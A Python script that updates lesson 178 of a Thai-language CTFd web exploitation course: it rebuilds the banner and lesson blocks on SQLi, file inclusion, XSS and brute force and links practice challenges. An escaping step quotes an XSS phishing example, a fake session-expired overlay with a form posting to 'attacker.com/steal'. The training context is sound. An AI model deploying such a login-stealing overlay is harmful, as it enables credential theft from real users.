import json
from CTFd import create_app
from CTFd.utils import markdown

app = create_app()
with app.app_context():
    from CTFd.plugins.tutorials import TutorialLesson
    from CTFd.models import db

    lesson = TutorialLesson.query.get(178)
    blocks = json.loads(lesson.content)

    print(f"Current Lesson 178 title: {lesson.title}")
    print(f"Current blocks count: {len(blocks)}")

    # Update Lesson Title
    lesson.title = "02. ช่องโหว่เว็บระดับสูง (SQLi, Command Injection, File Inclusion, XSS & Brute Force)"

    # 1. Update Block 0 (Banner)
    banner_html = """<div style="margin-bottom: 2rem; padding: 24px 30px; background: linear-gradient(135deg, rgba(8, 14, 30, 0.98) 0%, rgba(20, 10, 30, 0.98) 100%); border: 1px solid rgba(244, 63, 94, 0.35); border-radius: 18px; box-shadow: 0 16px 45px rgba(0, 0, 0, 0.7), 0 0 35px rgba(244, 63, 94, 0.15); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 20px;">
<div style="display: flex; align-items: center; gap: 20px; flex-wrap: wrap;">
<div style="width: 68px; height: 68px; border-radius: 16px; background: radial-gradient(circle, rgba(244, 63, 94, 0.25) 0%, rgba(15, 23, 42, 0.9) 100%); border: 1.5px solid rgba(244, 63, 94, 0.55); display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(244, 63, 94, 0.35); flex-shrink: 0; padding: 6px;">
<svg viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg" style="width:100%; height:100%; display:block; filter:drop-shadow(0 0 10px rgba(244, 63, 94, 0.7));">
<defs>
<linearGradient id="sqli-db-grad" x1="0%" y1="0%" x2="100%" y2="100%">
<stop offset="0%" stop-color="#1e293b"/>
<stop offset="50%" stop-color="#0f172a"/>
<stop offset="100%" stop-color="#020617"/>
</linearGradient>
<linearGradient id="sqli-needle-grad" x1="0%" y1="0%" x2="100%" y2="100%">
<stop offset="0%" stop-color="#ff007f"/>
<stop offset="50%" stop-color="#f43f5e"/>
<stop offset="100%" stop-color="#e11d48"/>
</linearGradient>
<linearGradient id="sqli-laser-core" x1="0%" y1="0%" x2="100%" y2="100%">
<stop offset="0%" stop-color="#ffffff"/>
<stop offset="100%" stop-color="#fb7185"/>
</linearGradient>
<filter id="neon-glow" x="-30%" y="-30%" width="160%" height="160%">
<feGaussianBlur stdDeviation="2.5" result="blur"/>
<feComposite in="SourceGraphic" in2="blur" operator="over"/>
</filter>
</defs>
<circle cx="60" cy="60" r="54" fill="none" stroke="rgba(244,63,94,0.25)" stroke-width="1.5" stroke-dasharray="6,4"/>
<circle cx="60" cy="60" r="48" fill="rgba(15,23,42,0.7)"/>
<ellipse cx="50" cy="85" rx="32" ry="11" fill="url(#sqli-db-grad)" stroke="#38bdf8" stroke-width="1.5"/>
<path d="M 18,85 L 18,97 C 18,104 82,104 82,97 L 82,85" fill="url(#sqli-db-grad)" stroke="#38bdf8" stroke-width="1.5"/>
<ellipse cx="50" cy="66" rx="32" ry="11" fill="url(#sqli-db-grad)" stroke="#f43f5e" stroke-width="1.8"/>
<path d="M 18,66 L 18,78 C 18,85 82,85 82,78 L 82,66" fill="url(#sqli-db-grad)" stroke="#f43f5e" stroke-width="1.8"/>
<ellipse cx="50" cy="47" rx="32" ry="11" fill="url(#sqli-db-grad)" stroke="#38bdf8" stroke-width="1.5"/>
<path d="M 18,47 L 18,59 C 18,66 82,66 82,59 L 82,47" fill="url(#sqli-db-grad)" stroke="#38bdf8" stroke-width="1.5"/>
<circle cx="28" cy="53" r="2" fill="#00f0ff"/>
<circle cx="28" cy="72" r="2" fill="#f43f5e"/>
<circle cx="28" cy="91" r="2" fill="#00f0ff"/>
<path d="M 52,66 L 46,72 L 54,75 L 49,82" fill="none" stroke="#f43f5e" stroke-width="2" stroke-linecap="round" filter="url(#neon-glow)"/>
<circle cx="50" cy="66" r="6" fill="none" stroke="#f43f5e" stroke-width="1.5" opacity="0.8"/>
<circle cx="50" cy="66" r="11" fill="none" stroke="#f43f5e" stroke-width="1" stroke-dasharray="3,3" opacity="0.6"/>
<rect x="94" y="8" width="14" height="4" rx="2" transform="rotate(45, 94, 8)" fill="#f1f5f9" stroke="#94a3b8" stroke-width="1"/>
<path d="M 88,18 L 74,32" stroke="#e2e8f0" stroke-width="2.5" stroke-linecap="round"/>
<rect x="58" y="26" width="30" height="15" rx="3" transform="rotate(45, 58, 26)" fill="url(#sqli-needle-grad)" stroke="#ffffff" stroke-width="1.5" filter="url(#neon-glow)"/>
<line x1="68" y1="31" x2="71" y2="28" stroke="#ffffff" stroke-width="1" opacity="0.8"/>
<line x1="74" y1="37" x2="77" y2="34" stroke="#ffffff" stroke-width="1" opacity="0.8"/>
<line x1="80" y1="43" x2="83" y2="40" stroke="#ffffff" stroke-width="1" opacity="0.8"/>
<path d="M 64,36 L 82,54" stroke="url(#sqli-laser-core)" stroke-width="2" stroke-linecap="round"/>
<polygon points="56,48 61,43 57,39 52,44" fill="#94a3b8" stroke="#ffffff" stroke-width="1"/>
<line x1="54" y1="46" x2="48" y2="52" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" filter="url(#neon-glow)"/>
<text x="76" y="92" fill="#f43f5e" font-family="'JetBrains Mono', monospace" font-size="8.5" font-weight="900" filter="url(#neon-glow)">';--</text>
<text x="82" y="74" fill="#00f0ff" font-family="'JetBrains Mono', monospace" font-size="7.5" font-weight="bold">1=1</text>
<circle cx="50" cy="66" r="3" fill="#ffffff" filter="url(#neon-glow)"/>
</svg>
</div>
<div>
<div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
<h2 style="margin: 0; font-size: 1.75rem; font-weight: 900; color: #ffffff; letter-spacing: -0.02em; text-shadow: 0 0 15px rgba(244, 63, 94, 0.5);">
WEB EXPLOITATION MASTERCLASS
</h2>
<span style="background: rgba(244, 63, 94, 0.15); color: #fca5a5; font-family: monospace; font-size: 0.68rem; font-weight: 800; padding: 3px 8px; border-radius: 4px; border: 1px solid rgba(244, 63, 94, 0.35); text-transform: uppercase;">
COMPLETE CHAPTER 5
</span>
</div>
<p style="margin: 6px 0 0 0; font-size: 0.88rem; color: #94a3b8; letter-spacing: 0.02em;">
Chapter 05: Web Exploitations &nbsp;|&nbsp; บทที่ 02 จาก 04 &bull; วิชาความมั่นคงปลอดภัยเว็บแอปพลิเคชัน (SQLi, Command Injection, LFI/RFI, XSS &amp; Brute Force)
</p>
</div>
</div>
<div style="display: flex; gap: 10px; flex-wrap: wrap; align-items: center;">
<span style="background: rgba(244, 63, 94, 0.15); border: 1px solid rgba(244, 63, 94, 0.4); border-radius: 20px; padding: 5px 14px; font-size: 0.78rem; font-weight: 700; color: #fca5a5; display: inline-flex; align-items: center; gap: 6px;">
<i class="fas fa-shield-halved" style="color: #f43f5e;"></i> OWASP Top 10
</span>
<span style="background: rgba(0, 240, 255, 0.12); border: 1px solid rgba(0, 240, 255, 0.35); border-radius: 20px; padding: 5px 14px; font-size: 0.78rem; font-weight: 700; color: #7dd3fc; display: inline-flex; align-items: center; gap: 6px;">
<i class="fas fa-flask" style="color: #00f0ff;"></i> 21 Practice Labs
</span>
<span style="background: rgba(251, 191, 36, 0.12); border: 1px solid rgba(251, 191, 36, 0.35); border-radius: 20px; padding: 5px 14px; font-size: 0.78rem; font-weight: 700; color: #fde047; display: inline-flex; align-items: center; gap: 6px;">
<i class="fas fa-flag" style="color: #fbbf24;"></i> CTF Challenges 01–32
</span>
</div>
</div>"""

    clean_banner = '\n'.join([l.strip() for l in banner_html.split('\n') if l.strip()])
    blocks[0]['value'] = clean_banner

    # Save the quiz block (currently at blocks[33])
    quiz_block = blocks[33]

    # Retain blocks 0 through 32
    new_blocks = blocks[:33]
    print(f"Retained {len(new_blocks)} existing blocks (0 to 32)")

    # Load SVGs & clean sections
    import assemble_all_remaining_chapter5 as a

    clean_lfi_no_blanks = '\n'.join([l.strip() for l in a.clean_lfi.split('\n') if l.strip()])
    
    # Properly escape phishing modal in XSS
    escaped_xss = a.clean_xss.replace(
        '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0b1224;z-index:9999;">',
        '&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0b1224;z-index:9999;"&gt;'
    ).replace(
        '<h3>Session หมดอายุ โปรดล็อกอินใหม่</h3>',
        '&lt;h3&gt;Session หมดอายุ โปรดล็อกอินใหม่&lt;/h3&gt;'
    ).replace(
        '<form action="http://attacker.com/steal" method="POST">...</form>',
        '&lt;form action="http://attacker.com/steal" method="POST"&gt;...&lt;/form&gt;'
    ).replace(
        '</div></code></pre>',
        '&lt;/div&gt;</code></pre>'
    )
    clean_xss_no_blanks = '\n'.join([l.strip() for l in escaped_xss.split('\n') if l.strip()])
    clean_brute_no_blanks = '\n'.join([l.strip() for l in a.clean_brute.split('\n') if l.strip()])

    card_30_clean = '\n'.join([l.strip() for l in a.card_30.split('\n') if l.strip()])
    card_31_clean = '\n'.join([l.strip() for l in a.card_31.split('\n') if l.strip()])
    card_25_clean = '\n'.join([l.strip() for l in a.card_25.split('\n') if l.strip()])
    card_26_clean = '\n'.join([l.strip() for l in a.card_26.split('\n') if l.strip()])
    card_27_clean = '\n'.join([l.strip() for l in a.card_27.split('\n') if l.strip()])
    card_28_clean = '\n'.join([l.strip() for l in a.card_28.split('\n') if l.strip()])
    card_29_clean = '\n'.join([l.strip() for l in a.card_29.split('\n') if l.strip()])

    # Append Section 3: File Inclusion (LFI & RFI)
    new_blocks.append({"type": "markdown", "value": clean_lfi_no_blanks, "challenge_id": None})
    new_blocks.append({"type": "markdown", "value": card_30_clean, "challenge_id": None})
    new_blocks.append({"type": "challenge", "value": "", "challenge_id": 30})
    new_blocks.append({"type": "markdown", "value": card_31_clean, "challenge_id": None})
    new_blocks.append({"type": "challenge", "value": "", "challenge_id": 31})

    # Append Section 4: Cross-Site Scripting (XSS) & XSStrike
    new_blocks.append({"type": "markdown", "value": clean_xss_no_blanks, "challenge_id": None})
    new_blocks.append({"type": "markdown", "value": card_25_clean, "challenge_id": None})
    new_blocks.append({"type": "challenge", "value": "", "challenge_id": 25})
    new_blocks.append({"type": "markdown", "value": card_26_clean, "challenge_id": None})
    new_blocks.append({"type": "challenge", "value": "", "challenge_id": 26})
    new_blocks.append({"type": "markdown", "value": card_27_clean, "challenge_id": None})
    new_blocks.append({"type": "challenge", "value": "", "challenge_id": 27})

    # Append Section 5: Brute Force Attacks (Hydra, Wfuzz & Python)
    new_blocks.append({"type": "markdown", "value": clean_brute_no_blanks, "challenge_id": None})
    new_blocks.append({"type": "markdown", "value": card_28_clean, "challenge_id": None})
    new_blocks.append({"type": "challenge", "value": "", "challenge_id": 28})
    new_blocks.append({"type": "markdown", "value": card_29_clean, "challenge_id": None})
    new_blocks.append({"type": "challenge", "value": "", "challenge_id": 29})

    # Append Quiz at the very end
    new_blocks.append(quiz_block)

    print(f"Final new blocks count: {len(new_blocks)}")

    # Verify rendering of all markdown blocks
    for i, b in enumerate(new_blocks):
        if b["type"] == "markdown":
            val = b["value"]
            r = markdown(val)
            # Check for plain unstyled <p> tags
            import re
            plain_p = re.findall(r'<p>(?!<style).*?</p>', r, flags=re.DOTALL)
            if plain_p:
                print(f"Warning: Block {i} has {len(plain_p)} plain <p> tags! Sample: {plain_p[0][:60]}")
            else:
                pass

    # Save to database
    lesson.content = json.dumps(new_blocks, ensure_ascii=False)
    db.session.commit()
    print("SUCCESS: Lesson 178 database commit completed successfully!")
